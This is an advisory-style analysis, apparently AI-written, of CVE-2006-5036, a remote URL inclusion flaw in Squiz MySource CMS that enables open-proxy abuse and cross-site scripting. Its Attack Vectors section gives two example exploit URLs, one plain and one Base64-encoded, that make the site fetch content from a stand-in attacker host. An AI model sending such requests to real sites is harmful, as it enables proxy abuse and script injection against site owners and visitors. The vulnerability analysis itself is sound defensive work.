Based on the provided content, here's an analysis of CVE-2006-5036:

**Root Cause of Vulnerability:**
The vulnerability stems from the `sq_remote_page_url` function in Squiz MySource Matrix and MySource CMS, which allows the inclusion of remote content into the body of the website.

**Weaknesses/Vulnerabilities Present:**
1.  **Unrestricted URL inclusion:** The software fetches and displays content from arbitrary URLs specified by the `sq_remote_page_url` parameter, without proper validation or filtering of the provided URL.
2.  **HTTP Proxy Functionality:** The vulnerable function effectively turns the MySource-based website into an open HTTP proxy.
3.  **Cross-Site Scripting (XSS):**  Remote content retrieved and displayed may contain malicious JavaScript, leading to XSS vulnerabilities.

**Impact of Exploitation:**
1.  **Proxy Misuse:** Attackers can use the vulnerable website as a proxy server, potentially masking their own activities and utilizing the website's bandwidth.
2. **Financial impact:** The proxied bandwidth can result in financial expenses for the website owner.
3.  **XSS Attacks:** The ability to include arbitrary JavaScript can be leveraged to perform XSS attacks, potentially stealing cookies or performing other malicious actions on client browsers.

**Attack Vectors:**
1. **Direct URL manipulation:** Attackers can directly manipulate the `sq_remote_page_url` parameter in the URL to include arbitrary content.
Example:  `http://www.mysource-example.com.au/$page?sq_remote_page_action=fetch_url&sq_remote_page_url=http://www.attacker.com/malicious.html`
2. **`sq_content_src` exploitation:** While newer versions use Base64 encoded URLs via the `sq_content_src` parameter, this can still be exploited if proper whitelisting is not in place.
Example: `http://www.mysource-example.com.au/$page?sq_content_src=aHR0cDovL3d3dy5hdHRhY2tlci5jb20vbWFsaWNpb3VzLmh0bWw=`

**Required Attacker Capabilities/Position:**
1. **Network Access:** The attacker needs network access to the vulnerable MySource website.
2. **Basic HTTP knowledge:** The attacker needs knowledge of how to manipulate HTTP requests and parameters.
3. **No authentication required:** The vulnerability can be exploited by anonymous users.

**Additional Notes:**
- The vendor did not initially consider this a vulnerability.
- Newer versions implement a whitelist and base64 encoding of the URL to mitigate this vulnerability, however, the effectiveness depends on proper configuration of the whitelist.
- The provided content offers more technical details than the standard CVE description.
